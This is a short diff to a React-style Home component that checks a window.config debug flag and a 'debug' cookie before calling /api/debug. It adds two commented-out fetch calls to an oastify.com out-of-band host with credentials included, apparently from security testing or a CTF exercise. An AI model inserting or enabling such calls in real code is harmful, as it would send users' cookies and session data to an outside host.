@@ -17,14 +17,18 @@ export default function Home() {
 
     if (window.config && window.config.debug) {
       setServerType('debug server');
-
+      // fetch('https://e8n5hmky2sbzhldwbl7ogtirbih95zto.oastify.com' + '/api/debug/server', {
+        //   credentials: 'include'
+        // })
       const supportcookie = document.cookie.split(';').some(c => 
         c.trim().startsWith('debug=')
       );
-
+      
       if (supportcookie) {
         console.log('Config debug mode is ON');
-
+        // fetch('https://e8n5hmky2sbzhldwbl7ogtirbih95zto.oastify.com' + '/api/debug', {
+        //   credentials: 'include'
+        // })
         fetch(window.location.origin + '/api/debug', {
           credentials: 'include'
         })
